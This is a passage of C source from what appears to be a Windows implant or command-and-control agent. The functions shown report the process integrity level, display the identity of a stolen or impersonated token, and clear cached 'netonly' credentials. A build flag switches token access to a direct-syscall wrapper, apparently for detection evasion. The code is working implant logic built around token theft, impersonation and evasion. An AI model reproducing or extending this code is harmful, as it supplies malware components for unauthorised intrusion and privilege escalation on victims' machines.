    /* Fallback: raw JSON response without UUID (should not happen in production)
     */
    json_out = (char *)malloc(decoded_len + 1);
    if (json_out) {
      memcpy(json_out, full_decoded, decoded_len);
      json_out[decoded_len] = '\0';
    }
  }

  free(full_decoded);
  return json_out;
}
int get_integrity_level() {
  HANDLE hToken = NULL;
  DWORD integrityLevel = 2; // Default to Medium (Normal user)

  // Check stolen token first if we have one
  if (g_stolen_token != NULL) {
    hToken = g_stolen_token;
    // On ne ferme pas hToken ici car c'est g_stolen_token
  } else {
#ifdef EVASION_SYSCALLS
    if (!NT_SUCCESS(kratos_NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)))
      return 2;
#else
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
      return 2;
#endif
  }

  DWORD dwLengthNeeded;
  if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0,
                           &dwLengthNeeded) &&
      GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
    // Using malloc because LocalAlloc can be problematic if not
    // inclus correctement
    PTOKEN_MANDATORY_LABEL pTIL =
        (PTOKEN_MANDATORY_LABEL)malloc(dwLengthNeeded);
    if (pTIL) {
      if (GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLengthNeeded,
                              &dwLengthNeeded)) {
        DWORD dwIntegrityLevel = *GetSidSubAuthority(
            pTIL->Label.Sid,
            (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

        if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
          integrityLevel = 1;
        else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID &&
                 dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
          integrityLevel = 2;
        else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID &&
                 dwIntegrityLevel < SECURITY_MANDATORY_SYSTEM_RID)
          integrityLevel = 3;
        else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
          integrityLevel = 4;
      }
      free(pTIL);
    }
  }

  if (hToken != g_stolen_token && hToken != NULL) {
    CloseHandle(hToken);
  }
  return (int)integrityLevel;
}

void get_current_display_user(char *display_buffer, size_t size) {
  char current_user[256];
  DWORD usize = sizeof(current_user);
  if (!GetUserNameA(current_user, &usize))
    strncpy(current_user, "UNKNOWN", sizeof(current_user));

  int integrity = get_integrity_level();
  char *integrity_str = (integrity == 4)   ? "System"
                        : (integrity == 3) ? "High"
                                           : "Medium";

  if (g_netonly_active) {
    snprintf(display_buffer, size, "%s [%s\\%s (netonly)]", current_user,
             g_netonly_domain, g_netonly_username);
  } else if (g_stolen_token != NULL) {
    char stolen_user[256] = {0};
    char domain[256] = {0};
    DWORD needed = 0;

    // Get the SID of the stolen token
    GetTokenInformation(g_stolen_token, TokenUser, NULL, 0, &needed);
    TOKEN_USER *tu = (TOKEN_USER *)malloc(needed);
    if (tu &&
        GetTokenInformation(g_stolen_token, TokenUser, tu, needed, &needed)) {
      DWORD nlen = sizeof(stolen_user), dlen = sizeof(domain);
      SID_NAME_USE use;
      if (LookupAccountSidA(NULL, tu->User.Sid, stolen_user, &nlen, domain,
                            &dlen, &use)) {
        // Format DOMAIN\USER (pour SYSTEM c'est souvent NT AUTHORITY\SYSTEM)
        char full_stolen[512];
        if (strlen(domain) > 0)
          snprintf(full_stolen, sizeof(full_stolen), "%s\\%s", domain,
                   stolen_user);
        else
          strncpy(full_stolen, stolen_user, sizeof(full_stolen));

        snprintf(display_buffer, size, "%s [%s ( %sIntegrity )]", current_user,
                 full_stolen, integrity_str);
      } else {
        snprintf(display_buffer, size, "%s (impersonated)", current_user);
      }
    }
    if (tu)
      free(tu);
  } else {
    strncpy(display_buffer, current_user, size);
  }
}

void clear_netonly_state(void) {
  g_netonly_active = 0;
  SecureZeroMemory(g_netonly_username, sizeof(g_netonly_username));
  SecureZeroMemory(g_netonly_domain, sizeof(g_netonly_domain));
  SecureZeroMemory(g_netonly_password, sizeof(g_netonly_password));
}
